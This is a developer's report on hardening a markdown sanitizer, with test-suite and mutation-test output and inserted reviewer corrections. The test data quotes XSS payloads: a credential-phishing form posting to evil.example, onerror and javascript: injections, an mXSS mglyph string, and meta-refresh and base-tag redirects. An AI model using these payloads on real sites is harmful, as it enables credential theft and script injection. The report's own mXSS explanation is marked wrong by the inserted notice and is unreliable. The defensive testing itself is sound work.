# dev-markdown-sanitize — issue #195

Branch `markdown-sanitize`, base `7a0f220`, commit `25bab77`. Not pushed.

> **EM correction notice (added after independent test review).** This report is
> accurate in its conclusions and its mutation evidence reproduces exactly, but
> **two explanatory claims below are wrong and should not be quoted as
> reference material.** See `test-195.md` §2 and §4 for the full derivation.
>
> 1. **The mXSS mechanism is mis-attributed.** This report says the `<img>`
>    disappears because "re-parsing through `innerHTML` foster-parents the
>    `<img>` out of existence." Foster-parenting *relocates* nodes, it does not
>    delete them. The actual cause is the **unterminated `title="` attribute
>    value** — the payload closes with the entity `&quot;` rather than a real
>    quote, so the value runs to EOF and the tokenizer discards the incomplete
>    tag. Proven by a discriminating experiment: strip all MathML/table context
>    and leave only the two `<img>` tags and the `img` still vanishes; terminate
>    the quote and it reappears.
>    **This makes the report's recommendation stronger, not weaker.** The
>    false-negative hazard is not an exotic MathML quirk — it is a general
>    property of re-parsing any truncated or unterminated-attribute markup, so
>    it applies to *every* structural assertion in the suite. The advice to
>    assert both structurally and on the raw string stands and is reinforced.
> 2. **The DOMPurify no-DOM failure-mode claim overstates the risk** — see
>    `test-195.md` §2.
>
> Both corrections came from an independent reviewer who reproduced the
> behaviour rather than reasoning from the config. Neither changes the verdict
> on the fix itself.

## Summary

`<form action>` is neutralised; `style`, `formaction` and `download` are gone.
The sanitizer now has a test suite — 32 checks against the real exported
`renderMarkdown` — where it previously had none. Both required mutations were
run and are pasted below.

One acceptance gate does **not** pass and I did not fix it: `find dist -name
'*.map' | wc -l` returns `1`. It is pre-existing and outside this branch's
scope. Details in "Found but not fixed" — this needs a decision from you.

## The fix

`web/src/util/markdown.ts`:

```ts
const FORBID_TAGS = ['form', 'input', 'button', 'select', 'textarea', 'option'];
const FORBID_ATTR = ['style', 'formaction', 'action', 'download'];

const parser = new Marked({
  renderer: {
    checkbox: ({ checked }: Tokens.Checkbox): string =>
      `<span class="ft-task-checkbox">${checked ? '☑' : '☐'}</span>`,
  },
});

export function renderMarkdown(md: string): string {
  return DOMPurify.sanitize(parser.parse(md) as string, { FORBID_TAGS, FORBID_ATTR });
}
```

As briefed, tag and attribute are both forbidden so neither is load-bearing.

Two small deviations from the brief's snippet, both deliberate:

1. **A private `Marked` instance rather than the global `marked` singleton.**
   The checkbox override has to go somewhere; putting it on the shared singleton
   via `marked.use()` would mutate global state for any future caller. `new
   Marked({...})` scopes it to this module. No behaviour difference for existing
   callers — verified, ordinary markdown output is byte-identical to before.
2. **The `checkbox` renderer override**, discussed below.

Verified the payload from the brief:

```
in : <form action="https://evil.example"><input name=token type=password><button>Sign in</button></form>
out: "Sign in"
```

Only the button's text node survives. Same run, other cases:

```
<div style="position:fixed">overlay</div>        -> <div>overlay</div>
<a href="https://x.example/f" download="a.exe">  -> <a href="https://x.example/f">dl</a>
<button formaction="https://evil.example">go</   -> <p>go</p>
<select><option>a</option></select>              -> <p></p>
```

## Checkbox / task-list decision

**Decision: preserve the state, as an inert glyph. Do not allow `input` back.**

The problem is real. Confirmed empirically that marked emits an `input` for
task-list syntax:

```
in : - [ ] unchecked item
     - [x] checked item
raw: <ul><li><input disabled="" type="checkbox"> unchecked item</li>
         <li><input checked="" disabled="" type="checkbox"> checked item</li></ul>
```

With `input` forbidden and nothing else done, both lines render as plain list
items and **`- [x] done` becomes indistinguishable from `- [ ] todo`**.

That is what tipped it. This is not cosmetic degradation like losing a border or
a font — it is silent loss of the one bit of information the syntax exists to
carry, in a *task tracker*, on content mirrored from GitHub issues where task
lists are among the most common markdown constructs. A reader would see a
checklist where completed and outstanding items look identical, with no
indication anything had been removed. "Degraded rendering beats a phishing
vector" is right, but here the degradation is actively misleading rather than
merely uglier, and I did not think it was worth accepting when the alternative
is small.

I considered and rejected the brief's other suggestion, **allowing `input` with
`type=checkbox` + `disabled` via a DOMPurify hook**. It would mean relaxing
`FORBID_TAGS` and re-adding safety through an `afterSanitizeAttributes` hook —
so the belt-and-braces property the brief specifically asked for would be gone,
replaced by a hook whose correctness I would have to reason about against
attacker input. DOMPurify hooks are also registered globally on the singleton.
More surface, more to get wrong, for the same user-visible result.

The chosen approach inverts that. The substitution happens in **marked**, before
DOMPurify ever runs, so the sanitizer's allowlist is never widened — `input`
stays fully forbidden and the mutation test below confirms it. The renderer
returns one of two constant strings selected by a boolean; no attacker-controlled
data reaches it. Cost is five lines.

Result:

```
in : - [ ] unchecked item
     - [x] checked item
out: <ul>
     <li><span class="ft-task-checkbox">☐</span> unchecked item</li>
     <li><span class="ft-task-checkbox">☑</span> checked item</li>
     </ul>
```

Nested lists verified too. The `class` is an inert styling hook; no CSS
references it today, so the glyphs render at body text size and weight. If you
want them styled, that is a follow-up in the inspector CSS, not here.

**Residual difference from GitHub:** GitHub renders task-list checkboxes as
interactive controls that write back to the issue. Farm Table's are static.
That was already true before this change (marked emits `disabled=""`), so
nothing regresses.

## Mutation testing

### Mutation 1 — revert the `FORBID_*` config

`return DOMPurify.sanitize(parser.parse(md) as string);`

```
Error: 8 of 32 markdown sanitizer checks failed:
  - form tag stripped: credential-phishing form survived: found <form> in "<form action=\"https://evil.example\"><input name=\"token\" type=\"password\"><button>Sign in</button></form>"
  - form action attribute stripped: attacker origin survived: found "evil.example" in "<form action=\"https://evil.example\"><input name=\"token\" type=\"password\"><button>Sign in</button></form>"
  - password input stripped: password field survived: found <input> in "<form action=\"https://evil.example\"><input name=\"token\" type=\"password\"><button>Sign in</button></form>"
  - submit button stripped: submit button survived: found <button> in "<form action=\"https://evil.example\"><input name=\"token\" type=\"password\"><button>Sign in</button></form>"
  - select and option stripped: select survived: found <select> in "<p><select><option>a</option></select></p>\n"
  - textarea stripped: textarea survived: found <textarea> in "<textarea>x</textarea>"
  - style attribute stripped: inline style survived: found "style=" in "<div style=\"position:fixed;top:0;left:0;width:100vw;height:100vh\">overlay</div>"
  - download attribute stripped: download attribute survived: found "download" in "<p><a href=\"https://x.example/f\" download=\"invoice.pdf\">dl</a></p>\n"
```

Restored → `markdown sanitizer: 32 checks passed`.

Two things worth reading off this. The `formaction` check did *not* fail, because
DOMPurify strips `formaction` by default — so that entry in `FORBID_ATTR` is
redundant belt-and-braces, not the active control. And the task-list checks did
not fail, correctly: the glyph substitution is independent of the sanitizer
config, which is the property I wanted.

### Mutation 2 — delete the `DOMPurify.sanitize` call entirely

`return parser.parse(md) as string;`

```
Error: 20 of 32 markdown sanitizer checks failed:
  - form tag stripped: credential-phishing form survived: found <form> in "<form action=\"https://evil.example\"><input name=token type=password><button>Sign in</button></form>"
  - form action attribute stripped: attacker origin survived: found "evil.example" in "<form action=\"https://evil.example\"><input name=token type=password><button>Sign in</button></form>"
  - password input stripped: password field survived: found <input> in "<form action=\"https://evil.example\"><input name=token type=password><button>Sign in</button></form>"
  - submit button stripped: submit button survived: found <button> in "<form action=\"https://evil.example\"><input name=token type=password><button>Sign in</button></form>"
  - select and option stripped: select survived: found <select> in "<p><select><option>a</option></select></p>\n"
  - textarea stripped: textarea survived: found <textarea> in "<textarea>x</textarea>"
  - formaction stripped: formaction survived: found "formaction" in "<p><button formaction=\"https://evil.example\">go</button></p>\n"
  - style attribute stripped: inline style survived: found "style=" in "<div style=\"position:fixed;top:0;left:0;width:100vw;height:100vh\">overlay</div>"
  - download attribute stripped: download attribute survived: found "download" in "<p><a href=\"https://x.example/f\" download=\"invoice.pdf\">dl</a></p>\n"
  - script tag stripped: script survived: found <script> in "<script>alert(1)</script>"
  - inline event handler stripped: event handler survived: IMG has onerror in "<img src=x onerror=alert(1)>"
  - javascript: href stripped: javascript: URL survived: found "javascript:" in "<p><a href=\"javascript:alert(1)\">click</a></p>\n"
  - data: html href stripped: data: HTML URL survived: found "data:text/html" in "<p><a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">click</a></p>\n"
  - iframe srcdoc stripped: iframe survived: found <iframe> in "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>"
  - mXSS mglyph payload neutralised: mXSS payload survived: found "alert(1)" in "<p><math><mtext><table><mglyph><style><!--</style><img title=\"--><img src=1 onerror=alert(1)>&quot;&gt;</p>\n"
  - base tag stripped: base survived: found <base> in "<base href=\"https://evil.example/\">"
  - meta refresh stripped: meta survived: found <meta> in "<meta http-equiv=\"refresh\" content=\"0;url=https://evil.example\">"
  - object and embed stripped: object survived: found <object> in "<p><object data=\"https://evil.example/x\"></object><embed src=\"https://evil.example/y\"></p>\n"
  - style element stripped: style element survived: found <style> in "<style>body{display:none}</style>"
  - target attribute stripped (no tabnabbing): target survived: found "target" in "<p><a href=\"https://x.example\" target=\"_blank\">x</a></p>\n"
```

Restored → `markdown sanitizer: 32 checks passed`.

The script-execution regression cases fire here and not under mutation 1, which
is the point: they are pinned to DOMPurify's presence, so a future config edit
cannot quietly disable them while "fixing" something else.

**One finding from mutation 2 worth flagging.** The mXSS case failed on the
raw-string assertion but *not* on `assertNoElement(out, 'img')` — re-parsing that
payload through `innerHTML` foster-parents the `<img>` out of existence, so a
purely DOM-query-based test would have reported the unsanitized mXSS payload as
clean. That is exactly the false negative mXSS tests are prone to. The suite
asserts both structurally and on the raw string for this reason; a reviewer
tempted to simplify those to one or the other should not.

## Test suite

`web/src/util/markdown.test.ts`, 32 checks, wired into `npm test`. It imports
the real `import { renderMarkdown } from './markdown.js'` — no re-implementation
of the pipeline. Coverage: form controls (7), spoofing attributes (2),
script-execution regressions (11), ordinary markdown (10), task lists (2).

Two notes on how it is built:

- **jsdom was added as a devDependency.** DOMPurify binds to `globalThis.window`
  when its module is first evaluated and degrades to a pass-through with
  `isSupported: false` when there is no DOM — which would have made every
  assertion vacuously pass. The test installs the jsdom window *before*
  dynamically importing `markdown.js`, and mutation 2 proves the binding is live
  (an unsanitized pipeline fails 20 checks rather than passing silently). This
  is the same jsdom/DOMPurify/marked combination the original audit used.
  `npm audit --audit-level=low` is still clean at 0 vulnerabilities.
- **Three shared files were touched beyond the sanitizer**: `package.json` (test
  script + the two devDeps), `package-lock.json`, and `tsconfig.test.json`
  (`include`). All are the test harness itself and all edits are additive. I
  flag them because `package-lock.json` is the one plausible conflict point with
  the other three in-flight branches — it is +578 lines, all jsdom's subtree.

## Collateral damage check

I checked both sinks and what feeds them before applying the config.

- `ft-inspector-desc.ts:233` renders `this.description`; `ft-inspector-comments.ts:221`
  renders `c.body`. Both are mirrored remote content. Neither depends on forms,
  inputs, buttons, or inline `style` in the *rendered markdown* — the inspector's
  own editing affordances are Shoelace components in the Lit template, entirely
  outside the sanitized string.
- `ft-inspector-comments.ts` does use `style="--size: 1.4rem; ..."` on an
  `sl-avatar`, but that is in the Lit template, not markdown output. `FORBID_ATTR`
  cannot reach it. Confirmed by build and by eye.
- Ordinary rendering is unaffected. Headings, emphasis, safe links, relative
  links, code blocks, inline code, lists, tables and images all verified with
  exact-output assertions, several byte-for-byte identical to pre-change output.

**No collateral damage found other than the task-list checkboxes**, which are
handled above.

## Found but not fixed

1. **`web/vite.config.ts` has `sourcemap: true`, so the build ships a source map
   and the `find dist -name '*.map' | wc -l` gate returns 1, not 0.**
   `dist/assets/index-DkAVF9N3.js.map`, 2.47 MB. `dist/` is embedded into the Go
   binary with `go:embed`, so this is served in production and exposes the
   original TypeScript source.
   Pre-existing, not caused by this branch: `sourcemap: true` is present at base
   `7a0f220` and on `origin/main`, `origin/task-state-web-ui-v2`,
   `origin/auth-stage4-deploy-prep`, `origin/auth-stage4-predeploy-fixes` and
   `origin/deploy-55-snapshot` — no in-flight branch fixes it.

   > **EM CORRECTION — this paragraph is factually wrong in one respect, and the
   > error matters because it changes who has to act.** Verified directly:
   >
   > | ref | `sourcemap` | `b35f36e` ancestor |
   > |---|---|---|
   > | `origin/main` | **true** | NO |
   > | `origin/task-state-web-ui-v2` | **false** | YES |
   > | `fixes-r3` | **false** | YES |
   > | `terminal-predicate` / `close-label-swap` / `markdown-sanitize` | true | NO |
   >
   > The claim that `origin/task-state-web-ui-v2` still carries `sourcemap: true`
   > is **incorrect** — commit `b35f36e` ("fix(web): harden safe-url and stop
   > shipping production sourcemaps") already sets it to `false` and is an
   > ancestor of the whole Phase 2 line. So "no in-flight branch fixes it" is
   > also wrong: the Phase 2 line fixes it.
   >
   > **What the report got right:** the exposure is genuinely live, because
   > `origin/main` lacks `b35f36e` and production is deployed from main. And it
   > was right to refuse to fix it on this branch.
   >
   > **Consequence:** this needs no new cleanup work. `#191`/`#194`/`#195` fork
   > from `main`, so they legitimately lack the fix and the
   > `find dist -name '*.map' | wc -l` gate correctly returns `1` on them in
   > isolation. That is expected, not a regression, and it resolves when
   > everything converges into `task-state-web-ui-v2` and that merges to main.
   > Tracked as GitHub **#196**. A merge-time check that `sourcemap: false`
   > survives the convergence is on the EM's list.
   I did not fix it: it is a one-line change to shared build infrastructure,
   explicitly outside this branch's scope, and touching it would put this branch
   in conflict with the deploy-prep branches. **Your call who takes it** — it is
   a genuine (low-severity) production information disclosure and currently
   nobody owns it.
2. **No Content-Security-Policy on the dashboard.** `form-action 'self'` would
   have independently prevented this entire bug class regardless of sanitizer
   config, and `script-src` would backstop the DOMPurify properties the suite now
   pins. Worth raising as its own issue; belongs with deploy config.
3. **`marked` runs with GFM defaults and no link-scheme allowlist.** Safe today
   because DOMPurify filters schemes, but it means the sanitizer is the single
   point of failure for URL safety. Noting it; not worth changing here.
4. Tests run under jsdom, not a real browser. mXSS behaviour is parser-specific,
   so these pin jsdom's behaviour, not Chromium's. Acceptable — it matches the
   original audit and the repo has no browser test harness — but it is a known
   limit of the guarantee.

## Verification

All run on the committed tree.

```
$ npm test
markdown sanitizer: 32 checks passed              # + task-ready suite, silent on pass

$ npx tsc --noEmit
(clean, no output)

$ npx tsc -p tsconfig.test.json --noEmit
(clean, no output)

$ npm run build
✓ 341 modules transformed.
dist/index.html                   1.12 kB │ gzip:   0.57 kB
dist/assets/index-Cxs8OCU6.css   36.27 kB │ gzip:   6.50 kB
dist/assets/index-DkAVF9N3.js   824.94 kB │ gzip: 210.66 kB │ map: 2,472.99 kB
✓ built in 4.93s

$ find dist -name '*.map' | wc -l
1                                                 # FAILS the gate — see finding 1

$ npm audit --audit-level=low
found 0 vulnerabilities

$ go build ./...     # clean
$ go test ./...      # all pass
```

Everything green except the source-map gate, which is pre-existing and out of
scope. No Phase 2 branch merged. Nothing touched outside the sanitizer, its
test, and the test harness wiring listed above.
